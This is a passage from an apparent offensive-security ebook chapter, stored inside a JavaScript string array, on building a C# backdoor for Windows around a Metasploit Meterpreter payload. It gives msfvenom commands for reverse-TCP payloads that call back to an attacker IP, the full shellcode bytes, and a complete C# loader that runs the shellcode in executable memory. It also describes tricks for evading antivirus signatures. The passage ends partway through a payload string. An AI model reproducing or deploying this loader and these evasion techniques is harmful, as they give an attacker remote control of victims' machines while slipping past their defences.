var contents = new Array("\n\r\n\r \n\r\n\rChapter 1 : Creating Simple Backdoor Payload by C#.NET \n\r\n\r \n\r\n\r\n\r•Goal : Understanding how Can Use Simple C# Code to Make Backdoor by Metasploit Payloads. \n\r\n\r\n\r•Creating C#.NET Code and Testing. \n\r\n\r\n\r•Videos. \n\r\n\r\n\r \n\r\n\rfirst of all before Begin this Course you need to know About how can use “Metasploit” also you should have work Experience with “C#.NET” Programming so this chapter is very important for this Course if you can understand what exactly we will do in this Chapter by Codes then you can understand other chapters codes very well .\n\r\n\rWe have 3 Important Points for all Chapters in this Course:\n\r\n\r\n\r1.Creating Metasploit Meterpreter Backdoor Payloads. \n\r\n\r\n\r2.Creating Simple Source Code by C# for Using Meterpreter Payloads (C# Backdoor). \n\r\n\r\n\r\n\rIntegration Meterpreter Payload (Native or Unmanaged Codes) with C# Codes (Managed Codes) \n\r\n\r\n\r\n\r3.Windows API Programming by C#. \n\r\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rNote : Don\'t worry it is not Necessary to understanding Windows API programming very well at least for my Codes but it is Necessary to Know how can Using Metasploit also How can creating C# Codes and how can Compile C# codes so you should have 1+ year of Experience with C# Programming at least . In this course I want to explain my codes very simple without complex Things in my codes so don\'t worry about C# Codes if you are Beginner in C# , I will try to Explain step by step my Codes at least for New Codes in these chapters.\n\r\n\r \n\r\n\rNote : These Separated Chapters for this eBook are Free Parts of my Course : “Bypassing AVS by C#.NET Programming” , I will Publish this “ebook” in 2018-2019 , “I hope” but I want to share these “Chapters/Videos/Codes” for you before Publish this eBook.\n\r\n\r \n\r\n\rImportant Point about this eBook and these Chapters : These Chapters are some “Free” Parts of my Course so Please don\'t Ask me about Full Chapters/Codes and Videos etc.\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rSo first of all you should know how can use Metasploit Meterpreter Payload (Unmanaged Code) for your C# Backdoor (Managed Code) so in this case I will use Msfvenom Tool to make Backdoor Payload. with “Kali Linux” you can Find this Command . \n\r\n\r \n\r\n\rNote : in this course you Need to know how can use Metasploit tool so in this course I will not Explain about this Penetration Test Framework. (Metasploit).\n\r\n\r \n\r\n\rBut before using this tool first we should talk about PAYLOADS in this case Meterpreter Payloads .\n\r\n\r \n\r\n\rQ. What is it and Why We need to use these PAYLOADS ?\n\r\n\r     A. Short Answer is : Payload is your Poison or your Venom to Attacking to target systems !\n\r\n\r \n\r\n\rExplaining Step by Step for Running PAYLOADS :\n\r\n\r \n\r\n\rStep A: Making Payloads by Msfvenom tool also Creating Backdoor.exe File\n\r\n\rStep B: Executing Backdoor.exe File in target system (Windows)\n\r\n\rStep C: Established Meterpreter Between Target system (Backdoor system) and Attacker system\n\r\n\r \n\r\n\rIn this course very Important Points are these Steps (Step 1 , Step 2).\n\r\n\r \n\r\n\rQ. Why Step 1 and Step 2 are Important ?\n\r\n\r \n\r\n\rA. Why Step 1 : Because to Make Backdoor you have a lot Ways to do this but some ways right now will detect by Anti viruses ! So this is very important to you which one of these ways you want to use for Bypassing Anti Viruses because with Signature Based AV probably some of these Payloads Will Detect and you should think about Ways to Bypassing AV in this step .\n\r\n\r \n\r\n\rA. Why Step 2 : Because in this step you want to Execute your Payload in Memory by File system “Backdoor.exe” so in this time you should think about Bypassing Anti Viruses Real-Time Monitoring by Techniques and Tricks .\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r\n\r\n\r \n\r\n\rStep A: Making Payloads by Msfvenom tool also Creating Backdoor.exe File\n\r\n\rin this step you can use Msfvenom tool for creating Payloads with Types like (Format Csharp or EXE).\n\r\n\rWhen you want to use your payload as executable Backdoor File then you should use (Format EXE) like Executable Format 1-2 and if you want to use Meterpreter Payload in your Codes like C# or C++ then you can use (Format csharp) or (Format C) like Transform Format 1-1. \n\r\n\r 1-1. Creating Metasploit Meterpreter Backdoor Payloads. (Transform Format : csharp)\n\r\n\rFor creating Native Code or Unmanaged Code for your Backdoor Payload you can use this Command with this syntax :\n\r\n\rmsfvenom --platform windows --arch x86_64 -p windows/x64/meterpreter/reverse_tcp  lhost=192.168.56.1 -f csharp &gt; payload.txt\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r 1-2. Creating Metasploit Meterpreter Backdoor Payloads. (Executable Format : EXE)\n\r\n\rFor creating Native Code or Unmanaged Code for your Backdoor Payload you can use this Command with this syntax :\n\r\n\rmsfvenom --platform windows --arch x86_64 -p windows/x64/meterpreter/reverse_tcp  lhost=192.168.56.1 -f exe &gt; Backdoor.exe\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rMsfvenom Command output Formats : \n\r\n\rExecutable formats:        \n\r\n\rasp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war\n\r\n\rTransform formats:\n\r\n\rbash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript\n\r\n\r \n\r\n\r95% up to 100% of Anti-Viruses Right Now will Detect your Payload if you make them by (Executable Format EXE)\n\r\n\rbut if you used (Format C) then you need to Create your Own Code for using this Payload with (Transform Format : csharp) then you have New Backdoor Code with New Signature so probably your Code and EXE file Will Not Detect by Signature-Based AV until Publishing Codes on Internet etc. nowadays New Codes Made By Powershell or C# are very New for Signature-Based AV so in the most time they will Bypass AVS very simple and I will show you how can Use Meterpreter PAYLOAD in this Case “windows/x64/meterpreter/reverse_tcp” for your C#.NET Code very simple .\n\r\n\r \n\r\n\rQ. How can use Transform Format C or Csharp output for Msfvenom Payload in C#.NET ?\n\r\n\rA. Short answer is : you can use this Output like String or Bytes Variable in C# .\n\r\n\r \n\r\n\rTrick-1  : Using String variables and Bytes variables by Simple Technique in C#.\n\r\n\r \n\r\n\rTrick-1-Step1: for making Csharp (Transform Format) you should run this command .\n\r\n\r \n\r\n\rmsfvenom --platform windows --arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.111 -f csharp &gt; payload_cs.txt\n\r\n\r \n\r\n\rto make Csharp (Transform Format) you should run this command and in this case my Kali linux local IP-Address was 192.168.1.111.\n\r\n\r \n\r\n\rroot@kali:~# msfvenom --platform windows --arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.111 -f csharp &gt; payload_cs.txt\n\r\n\rNo encoder or badchars specified, outputting raw payload\n\r\n\rPayload size: 510 bytes\n\r\n\rroot@kali:~# cat payload_cs.txt \n\r\n\rbyte[] buf = new byte[510] {\n\r\n\r0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,\n\r\n\r0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,\n\r\n\r0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,\n\r\n\r0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,\n\r\n\r0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,\n\r\n\r0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,\n\r\n\r0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,\n\r\n\r0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,\n\r\n\r0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,\n\r\n\r0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,\n\r\n\r0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,\n\r\n\r0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,\n\r\n\r0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,\n\r\n\r0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,\n\r\n\r0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,\n\r\n\r0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,\n\r\n\r0x49,0xbc,0x02,0x00,0x11,0x5c,0xc0,0xa8,0x01,0x6f,0x41,0x54,0x49,0x89,0xe4,\n\r\n\r0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,\n\r\n\r0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,\n\r\n\r0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,\n\r\n\r0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,\n\r\n\r0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,\n\r\n\r0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5,\n\r\n\r0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,\n\r\n\r0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,\n\r\n\r0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,\n\r\n\r0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,\n\r\n\r0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,\n\r\n\r0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,\n\r\n\r0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,\n\r\n\r0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5,\n\r\n\r0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,\n\r\n\r0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,\n\r\n\r0xff,0xe7,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };\n\r\n\r \n\r\n\r \n\r\n\rAs you can see we have these bytes in our Text File (payload_cs.txt)\n\r\n\r \n\r\n\rbyte[] buf = new byte[510] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00, . . . . . . . . ,0xb5,0xa2,0x56,0xff,0xd5 };\n\r\n\r \n\r\n\ralso our payload will start with these bytes “FC” , “48” and Finished “FF” , “D5” and our payload length was 510 bytes , in this output we have one Variable with Name “buf” with type of Bytes[] Array .\n\r\n\r \n\r\n\rNow you can Copy this Output and Paste that in your C# Projects but this is not Good Idea so in this chapter I will explain why Copy and Paste this buf Bytes[] Array variable to your Projects is not Good idea but now we should talk about other Things .\n\r\n\r \n\r\n\rTo starting New Project in VS.NET 2008 or 2015 you should Select C# Console Application also .NET Framework 4.0 or 3.5 or 2.0 only .\n\r\n\r \n\r\n\rIn “Source_Code_1” you can see my Simple Backdoor Code with Project Name “NativePayload_HardcodedPayload” so my Name-Space is “NativePayload_HardcodedPayload\".\n\r\n\r \n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\rusing System.Text;\n\r\n\r \n\r\n\rnamespace NativePayload_HardcodedPayload\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {\n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r            /// STEP 1: Begin\n\r\n\r            /// msfvenom --platform windows --arch x86_64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.37.129 -f c &gt; payload.txt\n\r\n\r            string payload = \"fc,48,83,e4,f0,e8,cc,00,00,00,41,51,41,50,52,51,56,48,31,d2,65,48,8b,52,60,48,8b,52,18,48,8b,52,20,48,8b,72,50,48,0f,b7,4a,4a,4d,31,c9,48,31,c0,ac,3c,61,7c,02,2c,20,41,c1,c9,0d,41,01,c1,e2,ed,52,41,51,48,8b,52,20,8b,42,3c,48,01,d0,66,81,78,18,0b,02,0f,85,72,00,00,00,8b,80,88,00,00,00,48,85,c0,74,67,48,01,d0,50,8b,48,18,44,8b,40,20,49,01,d0,e3,56,48,ff,c9,41,8b,34,88,48,01,d6,4d,31,c9,48,31,c0,ac,41,c1,c9,0d,41,01,c1,38,e0,75,f1,4c,03,4c,24,08,45,39,d1,75,d8,58,44,8b,40,24,49,01,d0,66,41,8b,0c,48,44,8b,40,1c,49,01,d0,41,8b,04,88,48,01,d0,41,58,41,58,5e,59,5a,41,58,41,59,41,5a,48,83,ec,20,41,52,ff,e0,58,41,59,5a,48,8b,12,e9,4b,ff,ff,ff,5d,49,be,77,73,32,5f,33,32,00,00,41,56,49,89,e6,48,81,ec,a0,01,00,00,49,89,e5,49,bc,02,00,11,5c,c0,a8,25,81,41,54,49,89,e4,4c,89,f1,41,ba,4c,77,26,07,ff,d5,4c,89,ea,68,01,01,00,00,59,41,ba,29,80,6b,00,ff,d5,6a,05,41,5e,50,50,4d,31,c9,4d,31,c0,48,ff,c0,48,89,c2,48,ff,c0,48,89,c1,41,ba,ea,0f,df,e0,ff,d5,48,89,c7,6a,10,41,58,4c,89,e2,48,89,f9,41,ba,99,a5,74,61,ff,d5,85,c0,74,0a,49,ff,ce,75,e5,e8,93,00,00,00,48,83,ec,10,48,89,e2,4d,31,c9,6a,04,41,58,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7e,55,48,83,c4,20,5e,89,f6,6a,40,41,59,68,00,10,00,00,41,58,48,89,f2,48,31,c9,41,ba,58,a4,53,e5,ff,d5,48,89,c3,49,89,c7,4d,31,c9,49,89,f0,48,89,da,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7d,28,58,41,57,59,68,00,40,00,00,41,58,6a,00,5a,41,ba,0b,2f,0f,30,ff,d5,57,59,41,ba,75,6e,4d,61,ff,d5,49,ff,ce,e9,3c,ff,ff,ff,48,01,c3,48,29,c6,48,85,f6,75,b4,41,ff,e7,58,6a,00,59,49,c7,c2,f0,b5,a2,56,ff,d5\";\n\r\n\r            string[] Xpayload = payload.Split(\',\');\n\r\n\r            byte[] X_Final = new byte[Xpayload.Length];\n\r\n\r            for (int i = 0; i &lt; Xpayload.Length; i++)\n\r\n\r            {\n\r\n\r                X_Final[i] = Convert.ToByte(Xpayload[i], 16);\n\r\n\r            }          \n\r\n\r \n\r\n\r// byte[] X_Final = new byte[] { 0xfc ,0x48 ,0x83 ,0xe4 ,0xf0 ,0xe8 ,0xcc ,0x00 ,0x00 ,0x00 ,0x41 ,0x51 ,0x41 ,0x50 ,0x52 ,0x51 ,0x56 ,0x48 ,0x31 ,0xd2 ,0x65 ,0x48 ,0x8b ,0x52 ,0x60 ,0x48 ,0x8b ,0x52 ,0x18 ,0x48 ,0x8b ,0x52 ,0x20 ,0x48 ,0x8b ,0x72 ,0x50 ,0x48 ,0x0f ,0xb7 ,0x4a ,0x4a ,0x4d ,0x31 ,0xc9 ,0x48 ,0x31 ,0xc0 ,0xac ,0x3c ,0x61 ,0x7c ,0x02 ,0x2c ,0x20 ,0x41 ,0xc1 ,0xc9 ,0x0d ,0x41 ,0x01 ,0xc1 ,0xe2 ,0xed ,0x52 ,0x41 ,0x51 ,0x48 ,0x8b ,0x52 ,0x20 ,0x8b ,0x42 ,0x3c ,0x48 ,0x01 ,0xd0 ,0x66 ,0x81 ,0x78 ,0x18 ,0x0b ,0x02 ,0x0f ,0x85 ,0x72 ,0x00 ,0x00 ,0x00 ,0x8b ,0x80 ,0x88 ,0x00 ,0x00 ,0x00 ,0x48 ,0x85 ,0xc0 ,0x74 ,0x67 ,0x48 ,0x01 ,0xd0 ,0x50 ,0x8b ,0x48 ,0x18 ,0x44 ,0x8b ,0x40 ,0x20 ,0x49 ,0x01 ,0xd0 ,0xe3 ,0x56 ,0x48 ,0xff ,0xc9 ,0x41 ,0x8b ,0x34 ,0x88 ,0x48 ,0x01 ,0xd6 ,0x4d ,0x31 ,0xc9 ,0x48 ,0x31 ,0xc0 ,0xac ,0x41 ,0xc1 ,0xc9 ,0x0d ,0x41 ,0x01 ,0xc1 ,0x38 ,0xe0 ,0x75 ,0xf1 ,0x4c ,0x03 ,0x4c ,0x24 ,0x08 ,0x45 ,0x39 ,0xd1 ,0x75 ,0xd8 ,0x58 ,0x44 ,0x8b ,0x40 ,0x24 ,0x49 ,0x01 ,0xd0 ,0x66 ,0x41 ,0x8b ,0x0c ,0x48 ,0x44 ,0x8b ,0x40 ,0x1c ,0x49 ,0x01 ,0xd0 ,0x41 ,0x8b ,0x04 ,0x88 ,0x48 ,0x01 ,0xd0 ,0x41 ,0x58 ,0x41 ,0x58 ,0x5e ,0x59 ,0x5a ,0x41 ,0x58 ,0x41 ,0x59 ,0x41 ,0x5a ,0x48 ,0x83 ,0xec ,0x20 ,0x41 ,0x52 ,0xff ,0xe0 ,0x58 ,0x41 ,0x59 ,0x5a ,0x48 ,0x8b ,0x12 ,0xe9 ,0x4b ,0xff ,0xff ,0xff ,0x5d ,0x49 ,0xbe ,0x77 ,0x73 ,0x32 ,0x5f ,0x33 ,0x32 ,0x00 ,0x00 ,0x41 ,0x56 ,0x49 ,0x89 ,0xe6 ,0x48 ,0x81 ,0xec ,0xa0 ,0x01 ,0x00 ,0x00 ,0x49 ,0x89 ,0xe5 ,0x49 ,0xbc ,0x02 ,0x00 ,0x11 ,0x5c ,0xc0 ,0xa8 ,0x25 ,0x81 ,0x41 ,0x54 ,0x49 ,0x89 ,0xe4 ,0x4c ,0x89 ,0xf1 ,0x41 ,0xba ,0x4c ,0x77 ,0x26 ,0x07 ,0xff ,0xd5 ,0x4c ,0x89 ,0xea ,0x68 ,0x01 ,0x01 ,0x00 ,0x00 ,0x59 ,0x41 ,0xba ,0x29 ,0x80 ,0x6b ,0x00 ,0xff ,0xd5 ,0x6a ,0x05 ,0x41 ,0x5e ,0x50 ,0x50 ,0x4d ,0x31 ,0xc9 ,0x4d ,0x31 ,0xc0 ,0x48 ,0xff ,0xc0 ,0x48 ,0x89 ,0xc2 ,0x48 ,0xff ,0xc0 ,0x48 ,0x89 ,0xc1 ,0x41 ,0xba ,0xea ,0x0f ,0xdf ,0xe0 ,0xff ,0xd5 ,0x48 ,0x89 ,0xc7 ,0x6a ,0x10 ,0x41 ,0x58 ,0x4c ,0x89 ,0xe2 ,0x48 ,0x89 ,0xf9 ,0x41 ,0xba ,0x99 ,0xa5 ,0x74 ,0x61 ,0xff ,0xd5 ,0x85 ,0xc0 ,0x74 ,0x0a ,0x49 ,0xff ,0xce ,0x75 ,0xe5 ,0xe8 ,0x93 ,0x00 ,0x00 ,0x00 ,0x48 ,0x83 ,0xec ,0x10 ,0x48 ,0x89 ,0xe2 ,0x4d ,0x31 ,0xc9 ,0x6a ,0x04 ,0x41 ,0x58 ,0x48 ,0x89 ,0xf9 ,0x41 ,0xba ,0x02 ,0xd9 ,0xc8 ,0x5f ,0xff ,0xd5 ,0x83 ,0xf8 ,0x00 ,0x7e ,0x55 ,0x48 ,0x83 ,0xc4 ,0x20 ,0x5e ,0x89 ,0xf6 ,0x6a ,0x40 ,0x41 ,0x59 ,0x68 ,0x00 ,0x10 ,0x00 ,0x00 ,0x41 ,0x58 ,0x48 ,0x89 ,0xf2 ,0x48 ,0x31 ,0xc9 ,0x41 ,0xba ,0x58 ,0xa4 ,0x53 ,0xe5 ,0xff ,0xd5 ,0x48 ,0x89 ,0xc3 ,0x49 ,0x89 ,0xc7 ,0x4d ,0x31 ,0xc9 ,0x49 ,0x89 ,0xf0 ,0x48 ,0x89 ,0xda ,0x48 ,0x89 ,0xf9 ,0x41 ,0xba ,0x02 ,0xd9 ,0xc8 ,0x5f ,0xff ,0xd5 ,0x83 ,0xf8 ,0x00 ,0x7d ,0x28 ,0x58 ,0x41 ,0x57 ,0x59 ,0x68 ,0x00 ,0x40 ,0x00 ,0x00 ,0x41 ,0x58 ,0x6a ,0x00 ,0x5a ,0x41 ,0xba ,0x0b ,0x2f ,0x0f ,0x30 ,0xff ,0xd5 ,0x57 ,0x59 ,0x41 ,0xba ,0x75 ,0x6e ,0x4d ,0x61 ,0xff ,0xd5 ,0x49 ,0xff ,0xce ,0xe9 ,0x3c ,0xff ,0xff ,0xff ,0x48 ,0x01 ,0xc3 ,0x48 ,0x29 ,0xc6 ,0x48 ,0x85 ,0xf6 ,0x75 ,0xb4 ,0x41 ,0xff ,0xe7 ,0x58 ,0x6a ,0x00 ,0x59 ,0x49 ,0xc7 ,0xc2 ,0xf0 ,0xb5 ,0xa2 ,0x56 ,0xff ,0xd5 };\n\r\n\r            \n\r\n\r            /// STEP 1: End\n\r\n\r            \n\r\n\r            /// STEP 2: Begin\n\r\n\r            UInt32 MEM_COMMIT = 0x1000;\n\r\n\r            UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine(\"Bingo Meterpreter session by Hardcoded Payload with strings ;)\");\n\r\n\r            UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)X_Final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r            Marshal.Copy(X_Final, 0x0000, (IntPtr)(funcAddr), X_Final.Length);\n\r\n\r            IntPtr hThread = IntPtr.Zero;\n\r\n\r            UInt32 threadId = 0x0000;\n\r\n\r            IntPtr pinfo = IntPtr.Zero;\n\r\n\r \n\r\n\r            hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);\n\r\n\r            WaitForSingleObject(hThread, 0xffffffff);\n\r\n\r            /// STEP 2: End\n\r\n\r        }\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\r\n\r    }\n\r\n\r}\n\r\n\r \n\r\n\rSource_Code_1 : Simple C# Backdoor with Metasploit Meterpreter Payload.\n\r\n\r \n\r\n\rWe should talk about Source_Code_1 step by step .\n\r\n\r \n\r\n\rFirst of all I want to talk about (Trick-1  : Using String variables) in this technique you can convert your payload from Byte[] Array Variable to Strings Variable then you can Hard-coded your payload in your source code by String Variable finally in MEMORY you will Convert This String Variable to Byte[] Array Variable again , But in this Time you will do it in MEMORY so Detecting this Convert from String to Bytes by AVS is Difficult at least for most of them .\n\r\n\r \n\r\n\rQ. Important Question : why we should not Use Byte[] array Variables by Default in Source Code ?\n\r\n\rA. Short Answer is : Detecting Meterpreter Payload by Bytes Variable in your exe or Source code is Simpler than String Variables also the most AV will not good Check/Scan Strings in your EXE.\n\r\n\rSo this code was better if you want to Hard-coded your Meterpreter Payload in C# Source Code.\n\r\n\r \n\r\n\r\n\r\n\rGood way ==&gt; string payload = \"fc,48,83,e4,f0,e8,cc,...........,56,ff,d5\";\n\r\n\rBad way ==&gt;  byte[] X_Final = new byte[] { 0xfc ,0x48 ,0x83 ,0xe4 ,0xf0,...};\n\r\n\rmaybe Safe way ==&gt; Don\'t Hard-coded Payloads in Source Codes.(we will talk about this in next chapters)\n\r\n\r \n\r\n\r \n\r\n\rlet me explain this Trick by Pictures .\n\r\n\rAs you can in these Codes I have two files , NativePayload_HardcodedPayload_string.exe and NativePayload_HardcodedPayload_bytes.exe \n\r\n\rThese files Compiled by two Tricks first String method second by Byte Method so we have these Codes for each :\n\r\n\r \n\r\n\rNativePayload_HardcodedPayload_string.exe C# Code :\n\r\n\r \n\r\n\r   string payload = \"fc,48,83,e4,f0,e8,cc,00,00,00,41,51,41,50,52,51,56,48,31,d2,65,48,8b,52,60,48,8b,52,18,48,8b,52,20,48,8b,72,50,48,0f,b7,4a,4a,4d,31,c9,48,31,c0,ac,3c,61,7c,02,2c,20,41,c1,c9,0d,41,01,c1,e2,ed,52,41,51,48,8b,52,20,8b,42,3c,48,01,d0,66,81,78,18,0b,02,0f,85,72,00,00,00,8b,80,88,00,00,00,48,85,c0,74,67,48,01,d0,50,8b,48,18,44,8b,40,20,49,01,d0,e3,56,48,ff,c9,41,8b,34,88,48,01,d6,4d,31,c9,48,31,c0,ac,41,c1,c9,0d,41,01,c1,38,e0,75,f1,4c,03,4c,24,08,45,39,d1,75,d8,58,44,8b,40,24,49,01,d0,66,41,8b,0c,48,44,8b,40,1c,49,01,d0,41,8b,04,88,48,01,d0,41,58,41,58,5e,59,5a,41,58,41,59,41,5a,48,83,ec,20,41,52,ff,e0,58,41,59,5a,48,8b,12,e9,4b,ff,ff,ff,5d,49,be,77,73,32,5f,33,32,00,00,41,56,49,89,e6,48,81,ec,a0,01,00,00,49,89,e5,49,bc,02,00,11,5c,c0,a8,25,81,41,54,49,89,e4,4c,89,f1,41,ba,4c,77,26,07,ff,d5,4c,89,ea,68,01,01,00,00,59,41,ba,29,80,6b,00,ff,d5,6a,05,41,5e,50,50,4d,31,c9,4d,31,c0,48,ff,c0,48,89,c2,48,ff,c0,48,89,c1,41,ba,ea,0f,df,e0,ff,d5,48,89,c7,6a,10,41,58,4c,89,e2,48,89,f9,41,ba,99,a5,74,61,ff,d5,85,c0,74,0a,49,ff,ce,75,e5,e8,93,00,00,00,48,83,ec,10,48,89,e2,4d,31,c9,6a,04,41,58,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7e,55,48,83,c4,20,5e,89,f6,6a,40,41,59,68,00,10,00,00,41,58,48,89,f2,48,31,c9,41,ba,58,a4,53,e5,ff,d5,48,89,c3,49,89,c7,4d,31,c9,49,89,f0,48,89,da,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7d,28,58,41,57,59,68,00,40,00,00,41,58,6a,00,5a,41,ba,0b,2f,0f,30,ff,d5,57,59,41,ba,75,6e,4d,61,ff,d5,49,ff,ce,e9,3c,ff,ff,ff,48,01,c3,48,29,c6,48,85,f6,75,b4,41,ff,e7,58,6a,00,59,49,c7,c2,f0,b5,a2,56,ff,d5\";\n\r\n\r            string[] Xpayload = payload.Split(\',\');\n\r\n\r            byte[] X_Final = new byte[Xpayload.Length];\n\r\n\r            for (int i = 0; i &lt; Xpayload.Length; i++)\n\r\n\r            {\n\r\n\r                X_Final[i] = Convert.ToByte(Xpayload[i], 16);\n\r\n\r            }          \n\r\n\r \n\r\n\rNativePayload_HardcodedPayload_bytes.exe C# Code :\n\r\n\r \n\r\n\r//   string payload = \"fc,48,83,e4,f0,e8,cc,00,00,00,41,51,41,50,52,51,56,48,31,d2,65,48,8b,52,60,48,8b,52,18,48,8b,52,20,48,8b,72,50,48,0f,b7,4a,4a,4d,31,c9,48,31,c0,ac,3c,61,7c,02,2c,20,41,c1,c9,0d,41,01,c1,e2,ed,52,41,51,48,8b,52,20,8b,42,3c,48,01,d0,66,81,78,18,0b,02,0f,85,72,00,00,00,8b,80,88,00,00,00,48,85,c0,74,67,48,01,d0,50,8b,48,18,44,8b,40,20,49,01,d0,e3,56,48,ff,c9,41,8b,34,88,48,01,d6,4d,31,c9,48,31,c0,ac,41,c1,c9,0d,41,01,c1,38,e0,75,f1,4c,03,4c,24,08,45,39,d1,75,d8,58,44,8b,40,24,49,01,d0,66,41,8b,0c,48,44,8b,40,1c,49,01,d0,41,8b,04,88,48,01,d0,41,58,41,58,5e,59,5a,41,58,41,59,41,5a,48,83,ec,20,41,52,ff,e0,58,41,59,5a,48,8b,12,e9,4b,ff,ff,ff,5d,49,be,77,73,32,5f,33,32,00,00,41,56,49,89,e6,48,81,ec,a0,01,00,00,49,89,e5,49,bc,02,00,11,5c,c0,a8,25,81,41,54,49,89,e4,4c,89,f1,41,ba,4c,77,26,07,ff,d5,4c,89,ea,68,01,01,00,00,59,41,ba,29,80,6b,00,ff,d5,6a,05,41,5e,50,50,4d,31,c9,4d,31,c0,48,ff,c0,48,89,c2,48,ff,c0,48,89,